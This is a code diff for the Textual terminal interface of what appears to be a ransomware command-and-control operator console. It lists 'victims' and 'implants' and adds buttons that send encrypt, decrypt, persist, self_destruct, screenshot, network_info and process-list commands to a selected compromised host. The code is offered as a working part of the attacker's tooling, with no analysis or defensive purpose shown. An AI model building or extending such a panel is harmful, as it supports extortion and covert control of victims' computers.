@@ -1,5 +1,5 @@
-from textual.widgets import Static, ListView, ListItem, RichLog, Input
-from textual.containers import Vertical
+from textual.widgets import Static, ListView, ListItem, RichLog, Input, Button
+from textual.containers import Vertical, Horizontal
 from textual.reactive import reactive
 
 
@@ -69,15 +69,46 @@ class VictimListWidget(ListView):
                 dp.refresh_content()
 
 
-class DetailPanel(Static):
+CMD_BUTTONS = [
+    ('encrypt', '#00e676'),
+    ('decrypt', '#ff6b6b'),
+    ('persist', '#ffd700'),
+    ('status', '#6e7681'),
+    ('self_destruct', '#ff4444'),
+    ('screenshot', '#00d4ff'),
+    ('network_info', '#b388ff'),
+    ('pslist', '#ff9100'),
+]
+
+
+class DetailPanel(Vertical):
     def __init__(self, client):
         super().__init__(id='detail-panel')
         self.client = client
 
+    def compose(self):
+        yield Static(id='detail-info')
+        yield Horizontal(*[
+            Button(name, id=f'cmd-{name}')
+            for name, _ in CMD_BUTTONS
+        ], id='command-buttons')
+
+    def on_mount(self):
+        colors = {name: color for name, color in CMD_BUTTONS}
+        for btn in self.query(Button):
+            name = btn.id[4:]
+            c = colors.get(name, '#e6edf3')
+            btn.styles.margin = (0, 0, 0, 1)
+            btn.styles.min_width = 12
+            btn.styles.background = '#1a1a2e'
+            btn.styles.color = c
+            btn.styles.border = ('solid', '#2d2d3d')
+
     def refresh_content(self):
         hostname = self.client.selected_hostname
+        info_text = self.query_one('#detail-info', Static)
         if not hostname or hostname not in self.client.victims:
-            self.update('[dim]No implant selected[/]')
+            info_text.update('[dim]No implant selected[/]')
             return
         info = self.client.victims[hostname]
         data = info.get('data', {})
@@ -88,18 +119,31 @@ class DetailPanel(Static):
         last_result = info.get('last_result')
         result_str = f'[#6e7681]Last:[/] {str(last_result.get("result", ""))[:60]}' if last_result else ''
 
-        self.update(
+        info_text.update(
             f'[bold #ffd700]═══ {hostname} ═══[/]\n'
             f'[#6e7681]IP:[/]      {data.get("ip", "?")}\n'
             f'[#6e7681]OS:[/]     {str(data.get("os", "?"))[:40]}\n'
             f'[#6e7681]Status:[/]  [{sc}]{status}[/]\n'
             f'[#6e7681]Plugins:[/] {plugins}\n'
             f'[#6e7681]Last:[/]    {last[:19] if last else "?"}\n'
-            f'{result_str}\n\n'
-            f'[dim][F5][/] [#00e676]Encrypt[/]  [dim][F6][/] [#ff6b6b]Decrypt[/]  '
-            f'[dim][F7][/] [#00d4ff]Exec[/]  [dim][L][/] [#b388ff]Load Plugin[/]  '
-            f'[dim][U][/] [#ff9100]Unload Plugin[/]'
+            f'{result_str}'
         )
+
+    def on_button_pressed(self, event: Button.Pressed):
+        cmd = event.button.id
+        if cmd and cmd.startswith('cmd-'):
+            name = cmd[4:]
+            hostname = self.client.selected_hostname
+            if not hostname:
+                return
+            params = {}
+            if name in ('exec', 'load_plugin', 'unload_plugin',
+                        'download', 'upload', 'pskill', 'find_files'):
+                return
+            self.client.send_command(hostname, name, params)
+            screen = self.screen
+            if hasattr(screen, '_log'):
+                screen._log(f'{name} → {hostname}')
 
 
 class CommandLogWidget(RichLog):
